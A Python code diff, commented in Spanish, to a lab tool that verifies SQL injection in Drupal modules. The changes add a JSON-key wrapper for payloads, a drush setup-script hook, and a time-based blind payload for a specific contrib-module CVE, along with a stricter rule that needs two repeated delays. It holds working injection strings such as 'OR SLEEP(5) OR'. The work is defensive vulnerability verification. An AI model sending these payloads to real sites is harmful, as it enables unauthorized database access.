@@ -754,6 +754,7 @@ def verify_drupal_sqli(
     module_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, sqli_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    json_key_envelope: str = "", extra_setup_script: str = "",
 ) -> WpVerifyResult:
     """Cuarta clase de Drupal ("poco a poco"): equivalente a verify_wordpress_sqli. Mismas TRES
     tecnicas, de mas a menos dura (ver la version de WordPress para el razonamiento completo):
@@ -763,7 +764,54 @@ def verify_drupal_sqli(
     El laboratorio de Drupal usa el mismo motor MySQL que el de WordPress, asi que la logica de
     deteccion es identica -- Drupal tambien soporta PostgreSQL/SQLite, pero esta version del
     laboratorio instala siempre contra MySQL (ver _bootstrap_drupal_lab), igual que el de
-    WordPress."""
+    WordPress.
+
+    `json_key_envelope` (opcional): forma REAL encontrada auditando CVE-2026-15081 /
+    SA-CONTRIB-2026-072 (modulo contrib Location Selector, filtro de Views
+    LocationSelectorFilter::opEqual(), <1.3.0). Alli el parametro HTTP expuesto no es el valor
+    SQL en si -- Drupal Views exige que `$this->value` sea JSON valido (`json_decode()`), y el
+    codigo vulnerable extrae `key($values['selected'])` (la CLAVE de un objeto anidado, no un
+    valor) y la concatena cruda dentro de `JSON_CONTAINS_PATH(campo, 'one', '$."selected"."` .
+    $value . `"')`. Las CUATRO tecnicas de arriba asumen lo contrario (que el valor crudo del
+    parametro ES directamente el fragmento SQL, splice-able con un sufijo de contexto como en
+    _bootstrap_drupal_sqli/_SQLI_CONTEXTS de genericverify.py) -- ninguna combinacion de esas
+    produce JSON valido, asi que contra esta forma real NUNCA llegan ni a ejecutar la consulta
+    (json_decode() falla primero y opEqual() ni se acerca al query builder). Cuando se pasa este
+    parametro (una plantilla con el placeholder literal "{key}" una vez, p.ej.
+    '{"selected":{"{key}":"1"}}'), cada candidato que las 4 tecnicas ya construyen (ctx/fn/
+    comentario, o el par true/false, o el par slow/fast) se sustituye en "{key}" ANTES de
+    enviarse, para que el parametro siga siendo JSON valido con el payload viviendo en la clave
+    anidada -- sin duplicar las 4 tecnicas ya escritas. Las comillas dobles literales dentro del
+    payload (los pares boolean-blind con contexto `"`) se escapan a mano para no romper el JSON
+    por accidente; no cambia que payload GANA, solo evita falsos "no JSON" en esos 2/5 pares.
+    Auditado en vivo contra el modulo REAL descargado de git.drupalcode.org (tag 8.x-1.2, la
+    ultima anterior al fix 8.x-1.3): time-based blind confirmado (~5.1s vs ~0.2s de base, 2
+    repeticiones independientes) con el payload clave `x' OR SLEEP(5) OR '` -- rompe la cadena de
+    un solo nivel, inyecta la condicion, y REABRE una cadena de un caracter que absorbe el `"`
+    fijo que el propio codigo vulnerable siempre antepone a su `'` de cierre (ese `"` suelto,
+    fuera de cualquier cadena, es justo lo que revento los primeros intentos con comentario `-- `:
+    comentar hasta fin de linea tambien se come el parentesis de cierre de la subconsulta que
+    Views agrega DESPUES, en la misma linea -- nunca se llega a enviar ese modulo real a este
+    repo, solo se uso para auditar la forma; el test commiteado reproduce la forma con un modulo
+    sintetico, igual que hizo joomlaverify.py con CVE-2025-40636).
+
+    `extra_setup_script` (opcional, tambien de esa misma auditoria): a diferencia de las demas
+    clases de Drupal ya soportadas (account-takeover/path-traversal/...), que son atacables
+    apenas `pm:enable` activa el modulo, la precondicion que la propia advisory describe para
+    este CVE ("una View que use el filtro afectado Y este configurada para aceptar entrada de
+    usuario") exige configurar algo MAS ALLA de activar el modulo: un campo del tipo que expone
+    el filtro, un nodo real con ese campo poblado (si no, el JOIN no tiene fila sobre la que
+    evaluar la expresion WHERE y SLEEP() nunca se ejecuta), y una View con ese filtro expuesto.
+    `_bootstrap_drupal_lab` no sabe nada de esto (ninguna CVE anterior lo necesito). Si se pasa
+    una cadena con codigo PHP, se copia al contenedor y se ejecuta con `drush scr` justo despues
+    de que el modulo este activo y ANTES de atacar -- auditado en vivo contra el modulo real:
+    `\\Drupal\\field\\Entity\\FieldStorageConfig`/`FieldConfig::create()` para el campo,
+    `Node::create()` para el nodo, y `\\Drupal\\views\\Entity\\View::create()` con un array que
+    reproduce exactamente el esquema de una View real (filtro `plugin_id` = lo que el propio
+    `hook_field_views_data_alter()` del modulo registra automaticamente para su tipo de campo),
+    seguido de `drupal_flush_all_caches()`. No es un mecanismo generico de instalacion -- es
+    exactamente el script, verbatim, que de verdad dejo el sitio en el estado que esta CVE
+    necesita; si una segunda CVE real necesitara algo parecido, generalizar entonces."""
     step = on_step or (lambda _m: None)
     pre = _check_prereqs(module_source_dir, slug)
     if pre is not None:
@@ -786,12 +834,33 @@ def verify_drupal_sqli(
         if boot is None:
             return res
 
+        if extra_setup_script:
+            step("ejecutando el script Drush adicional que esta CVE necesita (campo/nodo/View -- "
+                 "ver docstring de extra_setup_script)...")
+            script_path = f"/tmp/binoracle_extra_setup_{_token()}.php"
+            if not lab.write_canary(script_path, extra_setup_script):
+                res.detail = "no se pudo copiar el script Drush adicional al laboratorio"
+                return res
+            r = lab.drush("scr", script_path, timeout=120)
+            if r.returncode != 0:
+                res.detail = f"el script Drush adicional fallo: {(r.stderr or r.stdout or '')[:500]}"
+                res.logs.append("salida del script Drush adicional:\n" + (r.stdout or "") + (r.stderr or ""))
+                return res
+            res.logs.append("script Drush adicional OK:\n" + (r.stdout or "")[:500])
+
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
         orig_value = str(base_params.get(sqli_param) or "1")
 
         def send(val):
             payload = dict(base_params)
+            if json_key_envelope:
+                # ver docstring: el valor crudo que las 4 tecnicas ya construyeron se mete en la
+                # CLAVE JSON, no se manda tal cual -- json_decode() en el lado vulnerable debe
+                # seguir viendo JSON valido. Escapar las comillas dobles literales es lo unico
+                # que hace falta para eso con el payload REAL que esto audito (ninguna de las 4
+                # tecnicas usa backslashes ni saltos de linea).
+                val = json_key_envelope.replace("{key}", val.replace('"', '\\"'))
             payload[sqli_param] = val
             return boot.sub_sess.request(m, boot.base_url + endpoint,
                                data=payload if m != "GET" else None,
@@ -799,7 +868,8 @@ def verify_drupal_sqli(
 
         res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                              "login_bajo_privilegio_password": boot.sub_pass,
-                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint})
+                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint,
+                             "json_key_envelope": json_key_envelope})
 
         step("peticion de control (sin inyeccion)...")
         try:
@@ -944,43 +1014,75 @@ def verify_drupal_sqli(
             (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
             (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
             (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+            # forma real auditada contra CVE-2026-15081 (location_selector <1.3.0, ver docstring
+            # de json_key_envelope): aqui NO sirve un comentario de cierre -- el propio codigo
+            # vulnerable antepone un '"' suelto justo despues del valor inyectado (literal de su
+            # plantilla PHP), y comentar hasta fin de linea con '-- ' se come de paso el
+            # parentesis de cierre de la subconsulta que Views agrega DESPUES en la MISMA linea
+            # (confirmado en vivo: provoca un 1064 por parentesis sin cerrar). La cadena que SI
+            # funciono de verdad reabre con una comilla simple suelta al final, que absorbe ese
+            # '"' suelto como contenido literal y deja que la comilla y el parentesis de cierre
+            # YA FIJOS de la plantilla vuelvan a jugar su papel normal -- sin comentario alguno.
+            (f"{orig_value}' OR SLEEP(5) OR '", f"{orig_value}' OR SLEEP(0) OR '"),
         ]
+        # Real gap encontrado auditando CVE-2026-15081 (ver json_key_envelope/timing_pairs
+        # arriba): de las 4 formas de arriba, SOLO UNA es sintacticamente capaz de llegar al
+        # sumidero vulnerable de este CVE real -- las otras 3 ni siquiera producen una consulta
+        # valida contra el. Exigir "2 de N pares DISTINTOS" (como tenia este bucle antes) nunca
+        # puede pasar aqui aunque la inyeccion sea 100% real, porque solo 1 de los 4 pares tiene
+        # alguna chance. genericverify.py's verify_generic_sqli_blind ya resuelve exactamente
+        # esto de otra forma, mas rigurosa: exige 2 repeticiones INDEPENDIENTES DEL MISMO payload
+        # ganador por encima del umbral, en vez de que acuerden pares distintos -- mas fuerte
+        # contra ruido real (2 pruebas del mismo payload, no una prueba de 2 payloads diferentes)
+        # y no depende de que mas de una FORMA sea valida para el objetivo real. Replicado aqui.
         timing_tried = []
-        timing_consistent = 0
+        winner = None
         for slow_p, fast_p in timing_pairs:
             try:
                 t0_f = time.time()
                 send(fast_p)
                 fast_s = time.time() - t0_f
-                t0_sl = time.time()
+                t0_s1 = time.time()
                 send(slow_p)
-                slow_s = time.time() - t0_sl
+                slow_s1 = time.time() - t0_s1
+                t0_s2 = time.time()
+                send(slow_p)
+                slow_s2 = time.time() - t0_s2
             except Exception as e:
                 timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
                 continue
-            delayed = (slow_s - fast_s) >= 3.5
-            timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
-                                 "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
+            delayed = (slow_s1 - fast_s) >= 3.5 and (slow_s2 - fast_s) >= 3.5
+            timing_tried.append({"slow": slow_p, "fast": fast_p, "fast_s": round(fast_s, 2),
+                                 "slow_s_1": round(slow_s1, 2), "slow_s_2": round(slow_s2, 2),
+                                 "retraso_consistente_2_repeticiones": delayed})
             if delayed:
-                timing_consistent += 1
+                winner = (slow_p, fast_s, slow_s1, slow_s2)
+                break
         res.evidence["timing_intentos"] = timing_tried
 
-        if timing_consistent >= 2:
+        if winner:
+            slow_p, fast_s, slow_s1, slow_s2 = winner
             res.verified = True
             res.ok = True
             res.evidence["tecnica"] = "time-based-blind"
-            res.detail = (f"SQLI probable (time-based blind): {timing_consistent}/"
-                          f"{len(timing_pairs)} pares SLEEP(5)/SLEEP(0) mostraron un retraso "
-                          f"consistente")
-            step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
-                 f"mostraron retraso consistente")
+            res.evidence["payload_ganador"] = slow_p
+            res.evidence["tiempo_base_s"] = round(fast_s, 2)
+            res.evidence["tiempo_1_ganador_s"] = round(slow_s1, 2)
+            res.evidence["tiempo_2_ganador_s"] = round(slow_s2, 2)
+            res.detail = (f"SQLI confirmada (time-based blind): sqli_param={slow_p!r} retraso la "
+                          f"respuesta de forma CONSISTENTE en 2 repeticiones independientes "
+                          f"(~{round((slow_s1 + slow_s2) / 2, 1)}s contra una base de "
+                          f"~{round(fast_s, 2)}s) -- no es ruido de red/Docker")
+            step(f"VERIFICADO (time-based blind): {slow_p!r} retraso consistente en 2 "
+                 f"repeticiones independientes")
         else:
             res.ok = True
             res.detail = (f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) "
                           f"no filtraron version(), boolean-blind no mostro diferencia "
-                          f"consistente ({consistent_diffs}/{len(pairs)}) y time-based blind "
-                          f"tampoco ({timing_consistent}/{len(timing_pairs)}) -- la inyeccion "
-                          f"SQL no se confirmo")
+                          f"consistente ({consistent_diffs}/{len(pairs)}) y ningun payload "
+                          f"time-based blind de los {len(timing_pairs)} probados retraso la "
+                          f"respuesta de forma consistente en 2 repeticiones independientes -- "
+                          f"la inyeccion SQL no se confirmo")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
